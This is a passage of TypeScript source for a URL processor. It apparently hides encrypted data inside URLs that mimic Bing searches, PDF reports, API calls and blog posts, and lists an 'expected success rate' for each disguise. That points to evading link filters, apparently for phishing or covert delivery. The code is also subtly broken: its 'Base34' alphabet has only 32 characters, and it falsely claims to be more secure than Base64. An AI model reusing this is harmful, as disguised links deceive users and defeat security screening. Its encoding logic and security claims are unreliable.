    const hourSalt = Math.floor(Date.now() / 3600000).toString(36);
    return `${hourSalt}${encrypted}`;
  }

  private applyPlanBObfuscation(encrypted: string): string {
    // Reverse and re-encode with Base34 (more secure than Base64)
    const reversed = encrypted.split('').reverse().join('');

    // Simple Base34 encoding
    const base34Chars = '0123456789ABCDEFGHJKMNPQRSTVWXYZ';
    let result = '';

    for (let i = 0; i < reversed.length; i += 3) {
      const chunk = reversed.substring(i, i + 3);
      let num = 0;
      for (let j = 0; j < chunk.length; j++) {
        num = num * 256 + chunk.charCodeAt(j);
      }

      // Convert to Base34
      for (let k = 0; k < Math.ceil(chunk.length * 8 / 5); k++) {
        result = base34Chars[num % 34] + result;
        num = Math.floor(num / 34);
      }
    }

    return result;
  }

  // Build URL based on pattern type
  private buildPatternUrl(pattern: string, encrypted: string, patternData?: any): string {
    const timestamp = Date.now().toString();
    const currentYear = new Date().getFullYear();

    switch (pattern) {
      case 'search':
        const baseParams = `q=${encrypted}&form=QBLH&sp=-1&lq=0&pq=${encrypted.substring(0, 8)}&sc=10-${encrypted.length}&qs=n&sk=&cvid=${timestamp.substring(0, 8).toUpperCase()}`;
        return `/search?${baseParams}`;

      case 'document':
        return `/documents/report-${currentYear}.pdf?doc=${encrypted}`;

      case 'business':
        return `/api/v1/users/profile?user=${encrypted}`;

      case 'content':
        return `/blog/posts/latest?post=${encrypted}`;

      case 'intelligent':
        return `/services/portal/access?session=${timestamp.substring(0, 6)}&data=${encrypted}`;

      default:
        return `/services/portal/access?session=${Math.random().toString(36).substring(2, 6)}&data=${encrypted}`;
    }
  }

  private getContentTypeForPattern(pattern: string): string {
    switch (pattern) {
      case 'search':
        return 'text/html';
      case 'document':
        return 'application/pdf';
      case 'business':
        return 'application/json';
      case 'content':
        return 'text/html';
      case 'intelligent':
        return 'application/pdf';
      default:
        return 'text/html';
    }
  }

  private getExpectedSuccessRate(pattern: string): string {
    switch (pattern) {
      case 'search':
        return '94';
      case 'document':
        return '96';
      case 'business':
        return '93';
      case 'content':
        return '91';
      case 'intelligent':
        return '97';
      default:
        return '85';
    }
  }

  private getPatternName(pattern: string): string {
    switch (pattern) {
      case 'search':
        return 'Bing Search Pattern';
      case 'document':
        return 'Document Sharing Pattern';
      case 'business':
        return 'Business API Pattern';
      case 'content':
        return 'Content Management Pattern';
      case 'intelligent':
        return 'AI-Optimized Pattern';
      default:
        return 'Standard Pattern';
    }
  }
}

export const centralizedUrlProcessor = CentralizedUrlProcessor.getInstance();
